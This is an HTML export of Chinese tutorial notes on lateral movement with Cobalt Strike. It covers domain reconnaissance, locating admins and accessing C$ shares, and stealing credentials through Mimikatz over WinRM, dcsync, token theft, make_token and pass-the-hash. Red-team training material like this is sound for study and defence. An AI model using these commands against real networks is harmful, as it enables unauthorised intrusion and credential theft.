<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD87849D6{text-align:left;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid;list-style-type:decimal;color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs4FFB3A98{text-align:left;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid;list-style-type:disc;color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csDDE609C{text-align:left;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid;list-style-type:disc;color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs53B925A8{text-align:left;margin:5pt 24pt 5pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs2D2816FE{}
			.csC48167EA{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:1pt windowtext solid;border-left:none}
			.csA622D344{text-align:center;text-indent:0pt;margin:2pt 0pt 2pt 0pt}
			.csE0FE76B{text-align:left;text-indent:0pt;margin:2pt 0pt 2pt 0pt}
			.csE35A2CA7{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:none;border-left:none}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xc3bc6d32407e9f325fd54e4a3a4432e7425c09d"><span class="csDE05BCC">8. Lateral Movement(</span><span class="csECDA2D3">横向移动</span><span class="csDE05BCC">)</span></a></h1>
		<p class="cs6FD73CFB"><span class="cs8926E06">windows</span><span class="cs9C1B1871">内网渗透步骤：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csD87849D6"><a name="收集目标主机和用户信息："><span class="csD6CA00D2">收集目标主机和用户信息：</span></a></li><li class="cs63189908"><span class="cs9C1B1871">哪些系统是我可以进行攻击的</span></li><li class="cs63189908"><span class="cs9C1B1871">这些系统的哪些用户有管理员权限</span></li><li class="cs63189908"><span class="cs9C1B1871">使用已有的可信凭据去获取管理员权限</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">可信凭据：</span></li><li class="cs63189908"><span class="cs8926E06">access tokens</span></li><li class="cs63189908"><span class="cs8926E06">Password Hashes</span></li><li class="cs63189908"><span class="cs8926E06">Credentials</span></li><li class="cs63189908"><span class="cs8926E06">Kerberos Tickets</span></li><li class="cs63189908"><span class="cs9C1B1871">进行攻击</span></li><li class="cs63189908"><span class="cs9C1B1871">窃取文件</span></li><li class="cs63189908"><span class="cs9C1B1871">执行命令</span></li><li class="cs63189908"><span class="cs9C1B1871">执行某些</span><span class="cs8926E06">payload</span></li><li class="cs63189908"><span class="cs9C1B1871">提取更多的可信凭据然后重复上述步骤</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs4FFB3A98"><a name="X27b60c612b3d780c769675bdbb9c459f91023e9"><span class="csB2D98684">0x01 Windows Enterprise</span><span class="cs83F14626">（</span><span class="csB2D98684">windows</span><span class="cs83F14626">企业局域网）</span></a></li></ul>
		<ol start="14" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9FB05234">Active Directory</span><span class="cs9C1B1871">是用来管理域内用户、系统及策略配置的一个服务，以下简称</span><span class="cs9FB05234">AD</span></li><li class="cs63189908"><span class="cs9FB05234">Domain</span><span class="cs9C1B1871">（域）是一个管理员也是一个网络边界，在这里的用户和系统都是通过</span><span class="cs8926E06">AD</span><span class="cs9C1B1871">来管理的</span></li><li class="cs63189908"><span class="cs9FB05234">Domain Controller</span><span class="cs9C1B1871">（域控制器）用来管理</span><span class="cs8926E06">AD</span><span class="cs9C1B1871">内的用户和系统，它是域内权利最大的系统。</span></li><li class="cs63189908"><span class="cs9FB05234">Local User</span><span class="cs9C1B1871">（本地用户）：一个本地系统</span><span class="cs8926E06">/</span><span class="cs9C1B1871">主机上的标准用户，可以这样在</span><span class="cs8926E06">Cobal Strike</span><span class="cs9C1B1871">上这样来输入：</span><span class="cs9FB05234">.\user</span><span class="cs9C1B1871">或者</span><span class="cs9FB05234">COMPUTER_NAME\user</span></li><li class="cs63189908"><span class="cs9FB05234">Domain User</span><span class="cs9C1B1871">（域用户）：域用户是域控制器下的用户帐户，这些账户的详细名称是</span><span class="cs9FB05234">DOMAIN\user</span></li><li class="cs63189908"><span class="cs9FB05234">Local Administrator</span><span class="cs9C1B1871">：一个本地系统</span><span class="cs8926E06">/</span><span class="cs9C1B1871">主机上的有系统管理权限的用户</span></li><li class="cs63189908"><span class="cs9FB05234">Domain Administrator</span><span class="cs9C1B1871">（域管理员）：是一个在域控上拥有管理员权限的用户，是域上所有事情的本地管理员</span></li></ol>
		<h2 class="cs868C439D">
			<a name="Xae038bcd8ba19857d4e17330504e4a6c9adb57d"><span class="csB2D98684">0x02 Reconnaissance</span><span class="cs83F14626">（侦查）</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">域环境通常会针对不同的权限级别设置不同的信任关系，找出哪些是受信任的域、你可以登录哪些域、存放数据的位置</span></p><h3 class="cs868C439D">
			<a name="使用cobalt-strike收集域内信息"><span class="csD6CA00D2">使用</span><span class="csD1E291E2">Cobalt Strike</span><span class="csD6CA00D2">收集域内信息</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">windows command</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看当前网络内的域信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net view /DOMAIN </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查找域控，结果输出域控机器上的用户名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 32</span><span class="cs7FFD2630">位</span><span class="cs9FB05234">beacon</span><span class="cs7FFD2630">需要在</span><span class="cs9FB05234">console</span><span class="cs7FFD2630">上输入完整的</span><span class="cs9FB05234">nltext.exe</span><span class="cs7FFD2630">路径来执行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nltest /dclist:[DOMAIN]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net group &quot;Domain Controllers&quot; /DOMAIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看域内主机信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net view /DOMAIN:[DOAMIN] # </span><span class="cs7FFD2630">依赖于</span><span class="cs9FB05234">computer browser</span><span class="cs7FFD2630">服务，如果服务未开启，那么将没有结果输出</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net group &quot;Domain Coputers&quot; /DOMAIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># NetBIOS</span><span class="cs7FFD2630">名称在域上是每台机器的完整名称</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">将</span><span class="cs9FB05234">NetBIOS Name</span><span class="cs7FFD2630">转换为</span><span class="cs9FB05234">IP</span><span class="cs7FFD2630">地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># NetBIOS Name</span><span class="cs7FFD2630">举例</span><span class="cs9FB05234"> DESKTOP-ABCD123</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nslookup [NetBIOS Name]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ping -n &nbsp;1 [NetBIOS Name]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">获取域上的信任关系</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nltest /domain_trusts</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nltest /server:[address] /domain_trusts</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">列出主机上的共享</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net view \\[name]</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">net module</span><span class="cs9C1B1871">：通过调用</span><span class="cs8926E06">windows API</span><span class="cs9C1B1871">来执行命令</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">在</span><span class="cs9FB05234">beacon console</span><span class="cs7FFD2630">执行命令</span><span class="cs9FB05234">:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看域信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; net domain &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查找域控</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; net dclist [DOMAIN]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; net domain_controllers [DOMAIN]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看域内主机信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; net view [DOMAIN] # </span><span class="cs7FFD2630">与上文的</span><span class="cs9FB05234">windows</span><span class="cs7FFD2630">命令直接结果一致</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; net computers [DOMAIN.FQDN] # </span><span class="cs7FFD2630">与上文的</span><span class="cs9FB05234">net group</span><span class="cs7FFD2630">命令结果一致，但会额外输出主机的</span><span class="cs9FB05234">IP</span><span class="cs7FFD2630">信息</span></li><li class="cs24C36B3"><span class="cs9C1B1871">在</span><span class="cs8926E06">Beacon console</span><span class="cs9C1B1871">执行完查看结果后，可以点击</span><span class="cs9FB05234">target</span><span class="cs9C1B1871">图标显示你查找到的域控主机</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">PowerView</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">导入</span><span class="cs9FB05234">powershell</span><span class="cs7FFD2630">脚本</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; powershell-import /</span><span class="cs7FFD2630">本地路径</span><span class="cs9FB05234">/PowerView.ps1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看域信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; powerpick Get-NetDomain</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查找域控</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; powerpick Get-NetDomainController</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看域内主机信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; powerpick Get-NetComputer</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">SharpView .net</span><span class="cs9C1B1871">实现的</span><span class="cs8926E06">PowerView</span><span class="cs9C1B1871">功能的脚本</span></li></ul>
		<h3 class="cs868C439D">
			<a name="获取管理员权限"><span class="csD6CA00D2">获取管理员权限</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">当我们有了管理员权限之后，我们可以操作计划任务、与</span><span class="cs8926E06">C</span><span class="cs9C1B1871">盘进行交互、管理进程等等。域控的管理员可以作为任何一台域内主机的管理员进行操作。如果你想检查你当前的用户是否有管理员权限，可以在</span><span class="cs8926E06">beacon</span><span class="cs9C1B1871">上执行</span><span class="cs9FB05234">ls \\hosts\C$</span><span class="cs9C1B1871">查看是否允许访问</span><span class="cs8926E06">C</span><span class="cs9C1B1871">盘目录，也可以使用</span><span class="cs8926E06">Powerview</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">powerpick Find-LocalAdminAccess</span><span class="cs9C1B1871">来查看用户权限。</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">举例：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">域：</span><span class="cs9FB05234">corp.acme.com</span><span class="cs8926E06"><br/>powershell</span><span class="cs9C1B1871">执行结果：</span><span class="cs9FB05234">fileserver.corp.acme.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ls \\fileserver\C$</span><span class="cs9C1B1871">：输出该服务器上的</span><span class="cs8926E06">C</span><span class="cs9C1B1871">盘目录</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">查找域控管理员</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">使用</span><span class="cs9FB05234">run</span><span class="cs7FFD2630">执行</span><span class="cs9FB05234">windows</span><span class="cs7FFD2630">系统命令</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net group &quot;enterprise admins&quot; /DOMAIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net group &quot;domain admins&quot; /DOMAIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net localgroup &quot;administrator&quot; /DOMAIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">使用</span><span class="cs9FB05234">Beacon</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">net</span><span class="cs7FFD2630">模块</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net group \\DC Domain Admins</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">net localgroup \\DC Administrators</span></li></ul>
		<ol start="2" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">本地管理员</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">本地管理员用户一定是在本地的管理员组中的，这个用户也可能是一个域用户</span><span class="cs8926E06"> ```shell</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="csDDE609C"><a name="beacon-net-module"><span class="csDE05BCC">beacon net module</span></a></li><li class="cs24C36B3"><span class="cs8926E06">net localgroup \TARGET net localgroup \TARGET group_name</span></li><li class="csDDE609C"><a name="如net-localgroup-target-administrators"><span class="csECDA2D3">如</span><span class="csDE05BCC">net localgroup \TARGET administrators</span></a></li></ul>
		<h1 class="csAD577193">
			<a name="powerview"><span class="csDE05BCC">powerview</span></a></h1>
		<h1 class="csAD577193">
			<a name="针对一台主机进行查询"><span class="csECDA2D3">针对一台主机进行查询</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs8926E06">powershell Get-NetLocalGroup -HostName TARGET</span></p><h1 class="csAD577193">
			<a name="针对多台主机进行查询"><span class="csECDA2D3">针对多台主机进行查询</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs8926E06">powershell Invoke-EnumerateLocalAdmin</span></p><p class="cs3A447A38"><span class="cs9FB05234">&gt; </span><span class="cs7FFD2630">注意：</span><span class="cs9FB05234">Window10 RS1(2016)</span><span class="cs7FFD2630">和</span><span class="cs9FB05234">Windows Server2016</span><span class="cs7FFD2630">要求在查询本地组时需要使用管理员权限，若需要查看那么需要先打一个补丁</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">如果你有一个本地账户的密码或者密码哈希，如果这个用户是</span><span class="cs9FB05234">RID500</span><span class="cs7FFD2630">（系统用户，比如</span><span class="cs9FB05234">Administrator</span><span class="cs7FFD2630">、</span><span class="cs9FB05234">Guest</span><span class="cs7FFD2630">等）且账户未被禁用，那么你可以在认证后执行远程操作。如果你拥有密码的用户是一个非</span><span class="cs9FB05234">RID500</span><span class="cs7FFD2630">的用户，那么将不能进行认证以进行远程操作，除非你可以通过远程桌面登录。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## 0x03 Agentless Post Exploitation</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">在获取到一台主机的权限后，不建议再传递</span><span class="cs9FB05234">payload</span><span class="cs7FFD2630">去执行各种操作。可以采取如下办法：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">- </span><span class="cs7FFD2630">使用</span><span class="cs9FB05234">UNC</span><span class="cs7FFD2630">路径来引用其他主机上的文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">```shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">从指定的目标主机上列举文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell dir \\host\C$\foo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">拷贝远程主机上的文件到本地</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell copy \\host\C$\foo\secrets.txt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">将执行</span><span class="cs9FB05234">dir /S /B</span><span class="cs7FFD2630">的结果保存至文件中</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell dir /S /B \\host\c$ &gt; files.txt</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">File Browser</span><span class="cs9C1B1871">上的地址栏查看文件</span><span class="cs8926E06"> <img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image0.png" width="560" height="305" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">使用</span><span class="cs8926E06">WinRM</span><span class="cs9C1B1871">来执行命令</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">使用</span><span class="cs9FB05234">powershell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">powershell Invoke-Command -ComputerName TARGET -ScriptBlock {</span><span class="cs7FFD2630">要执行的命令</span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">通过</span><span class="cs9FB05234">WinRM</span><span class="cs7FFD2630">使用</span><span class="cs9FB05234">PowerSploit</span><span class="cs7FFD2630">来运行</span><span class="cs9FB05234">Mimikatz</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">powershell-import /path/Invoke-Mimikatz.ps1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">powershell Invoke-Mimikatz -ComouterName TARGET</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Mimikatz</span><span class="cs7FFD2630">有</span><span class="cs9FB05234">32</span><span class="cs7FFD2630">位和</span><span class="cs9FB05234">64</span><span class="cs7FFD2630">位的，建议不要使用</span><span class="cs9FB05234">32</span><span class="cs7FFD2630">位的，另外</span><span class="cs9FB05234">Mimikatz</span><span class="cs7FFD2630">需要将</span><span class="cs9FB05234">$PEBytes32</span><span class="cs7FFD2630">重新修改为空</span></li><li class="cs24C36B3"><span class="cs8926E06">PowerSploit</span><span class="cs9C1B1871">可参考</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/PowerShellMafia/PowerSploit"><span class="cs4B51D5E4">https://github.com/PowerShellMafia/PowerSploit</span></a></span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">使用</span><span class="cs9FB05234">dcsync</span><span class="cs9C1B1871">来提取用户哈希，可以在</span><span class="cs9FB05234">Credentials</span><span class="cs9C1B1871">面板上看到提取到的</span><span class="cs8926E06">hash</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">dcsync [domain] &nbsp;[DOMAIN\user]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">dcsync [domain]</span></li><li class="cs24C36B3"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image1.png" width="560" height="206" alt="" style="border-width:0px;" /></span></li><li class="cs4FFB3A98"><a name="X08506d4584edc18239b7b5e5ceefe8b8d6e14e8"><span class="csB2D98684">0x04 Trust Material</span></a></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">access token</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs53B925A8"><span class="cs8926E06">windows</span><span class="cs9C1B1871">的每个用户登录系统后，系统都会生成一个</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">，用户登录后创建的每一个进程都含有该用户的</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">的备份，当进程试图执行某些需要特殊权限的操作或者访问受保护的内核对象时，系统会检查其</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">中的权限信息以决定是否授权操作。</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户组成员的</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">中会含有一些可以执行系统级操作的特权，但是这些特权默认是被禁用的，如果需要进行特权操作，那么进程则必须打开这些禁用的特权，即权限提升。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">参考</span><span class="cs8926E06"> <a class="cs508254C" href="https://blog.csdn.net/zxh2075/article/details/8621821"><span class="cs4B51D5E4">https://blog.csdn.net/zxh2075/article/details/8621821</span></a></span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看进程列表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ps</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">窃取</span><span class="cs9FB05234">token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">steal_token [pid]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看你拿到的</span><span class="cs9FB05234">token</span><span class="cs7FFD2630">所关联的用户</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">getuid</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">返回到控制目标主机的初始的</span><span class="cs9FB05234">token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rev2self</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">示例：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">（</span><span class="cs8926E06">1</span><span class="cs9C1B1871">）</span><span class="cs8926E06">beacon</span><span class="cs9C1B1871">右键</span><span class="cs8926E06">interact<br/></span><span class="cs9C1B1871">（</span><span class="cs8926E06">2</span><span class="cs9C1B1871">）右键</span><span class="cs8926E06"> &gt; Explore &gt; Process List</span><span class="cs9C1B1871">，可以看到哪些</span><span class="cs8926E06">process</span><span class="cs9C1B1871">的</span><span class="cs8926E06">token</span><span class="cs9C1B1871">是可获得的</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image2.png" width="560" height="302" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">然后</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">就会执行</span><span class="cs9FB05234">steal_token 3716</span><span class="cs9C1B1871">，接着我们就有了这个</span><span class="cs9FB05234">jim.stevens</span><span class="cs9C1B1871">的权限了</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image3.png" width="560" height="314" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">执行</span><span class="cs9FB05234">getuid</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">rev2self</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image4.png" width="560" height="350" alt="" style="border-width:0px;" /></span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">credentials</span><span class="cs9C1B1871">（凭据）</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">如果你有目标主机管理员用户的用户名和它的密码，你可以这样做</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">创建一个</span><span class="cs9FB05234">beacon </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">spawnas DOMAIN\user password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">通过</span><span class="cs9FB05234">make_token</span><span class="cs7FFD2630">命令来创建</span><span class="cs9FB05234">token</span><span class="cs7FFD2630">以传递凭据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">make_token DOMAIN\user password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">当你提供的用户名或者密码有误时，你对远程主机进行的任何操作都会报错</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># make_token</span><span class="cs7FFD2630">命令执行后会拷贝你当前使用的</span><span class="cs9FB05234">token</span><span class="cs7FFD2630">，然后给出一个新的</span><span class="cs9FB05234">logon session</span></li><li class="cs24C36B3"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image5.png" width="560" height="221" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image6.png" width="560" height="302" alt="" style="border-width:0px;" /></span></li></ul>
		<ol start="2" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">password hashes(PTH)</span></li><li class="cs63189908"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">传递</span><span class="cs8926E06">hash</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">pth DOMAIN\user ntlmhash</span></li><li class="cs24C36B3"><span class="cs9C1B1871">首先我们需要基于你提供的</span><span class="cs8926E06">hash</span><span class="cs9C1B1871">创建一个带有</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">的进程，</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">会通过</span><span class="cs8926E06">steal_token</span><span class="cs9C1B1871">获取到这个临时进程的</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">。</span></li></ul>
